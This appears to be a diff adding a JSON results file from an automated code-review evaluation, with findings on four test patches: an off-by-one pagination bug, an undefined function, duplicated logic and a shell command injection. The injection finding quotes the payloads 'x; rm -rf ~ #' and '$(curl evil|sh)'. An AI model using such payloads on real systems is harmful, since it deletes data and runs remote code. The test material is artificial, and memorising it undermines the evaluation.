@@ -1,0 +1,123 @@
+{
+  "confirmation_reruns": [],
+  "invocations": [
+    {
+      "case_id": null,
+      "run": {
+        "cases": [
+          {
+            "id": "correctness-off-by-one-pagination",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Page slice returns one item too many `end = offset + page_size + 1` makes the slice `items[offset:offset + page_size + 1]`, which is `page_size + 1` elements. The pre-image used `offset + page_size`. For `items=[1..10]`, `page_number=1`, `page_size=3`, the function returns `[1, 2, 3, 4]`. Page 2 starts at offset 3 and returns `[4, 5, 6, 7]`, so item 4 appears on both pages. Every non-final page returns more rows than requested. Consecutive pages duplicate a boundary item, and callers that rely on `len(page) == page_size` break. This corrupts any listing or API that uses this helper.",
+                "extra": {
+                  "defect_kind": "off-by-one",
+                  "evidence_quotes": [
+                    "end = offset + page_size + 1",
+                    "items[offset:offset + page_size + 1]",
+                    "page_size + 1",
+                    "offset + page_size",
+                    "items=[1..10]",
+                    "page_number=1",
+                    "page_size=3",
+                    "[1, 2, 3, 4]",
+                    "[4, 5, 6, 7]"
+                  ]
+                },
+                "location": {
+                  "line": 3,
+                  "path": "app/pagination.py"
+                },
+                "severity": "P1"
+              }
+            ],
+            "status": "executed"
+          },
+          {
+            "id": "no-op-comment-and-rename",
+            "input_kind": "patch",
+            "produced_findings": [],
+            "status": "executed"
+          },
+          {
+            "id": "quality-duplicated-branch-logic",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "`send_sms` is undefined, so the SMS path raises `NameError` `send_sms` is called on line 7. The repository has one tracked file, `app/notify.py`. A search of the working tree finds no `def send_sms`, no import and no other reference. `format_message` and `send_email` are also undefined or unimported there, but this delta did not introduce them. `notify(user, \"sms\")` raises `NameError` at runtime instead of sending a message. The new feature cannot work as submitted, and the failure surfaces only when the SMS path runs.",
+                "extra": {
+                  "defect_kind": "undefined-name",
+                  "evidence_quotes": [
+                    "send_sms",
+                    "app/notify.py",
+                    "def send_sms",
+                    "format_message",
+                    "send_email"
+                  ]
+                },
+                "location": {
+                  "line": 7,
+                  "path": "app/notify.py"
+                },
+                "severity": "P1"
+              },
+              {
+                "claim": "Duplicated branch logic in `notify` The `sms` branch copies the `email` branch (lines 2-4). Both build `msg = format_message(user)`, then call a channel-specific sender. Only the recipient attribute and the sender differ. Each new channel adds another copy of the message-building step. Changes to message construction, such as per-channel formatting or error handling, must be made in every branch, which invites drift.",
+                "extra": {
+                  "defect_kind": "duplicated-branch-logic",
+                  "evidence_quotes": [
+                    "sms",
+                    "email",
+                    "msg = format_message(user)"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 7,
+                    "start": 5
+                  },
+                  "path": "app/notify.py"
+                },
+                "severity": "P2"
+              }
+            ],
+            "status": "executed"
+          },
+          {
+            "id": "security-command-injection",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Shell command injection via `name` in `make_archive` `name` is interpolated unquoted into a string passed to `subprocess.run(..., shell=True)`, so the shell parses it. A value such as `x; rm -rf ~ #` or `$(curl evil|sh)` runs as a command. The previous list-form call passed `name` as a single argv element with no shell. `name` is the function's only parameter, and the repository gives no sanitization or allow-listing of it. `make_archive` has no callers in the repo, so the review could not check what feeds `name`. For a public backup helper, treat the value as untrusted. Any caller that passes user-influenced input, such as a request parameter, job name or filename, gives an attacker code execution with the process's privileges. That means arbitrary file read, write or deletion and a path to full host compromise. The change also turns safe argv handling into an exploitable path, which is a regression.",
+                "extra": {
+                  "defect_kind": "command-injection",
+                  "evidence_quotes": [
+                    "name",
+                    "subprocess.run(..., shell=True)",
+                    "x; rm -rf ~ #",
+                    "$(curl evil|sh)",
+                    "name",
+                    "name",
+                    "make_archive",
+                    "name"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 6,
+                    "start": 5
+                  },
+                  "path": "app/backup.py"
+                },
+                "severity": "P0"
+              }
+            ],
+            "status": "executed"
+          }
+        ],
+        "ok": true
+      }
+    }
+  ]
+}
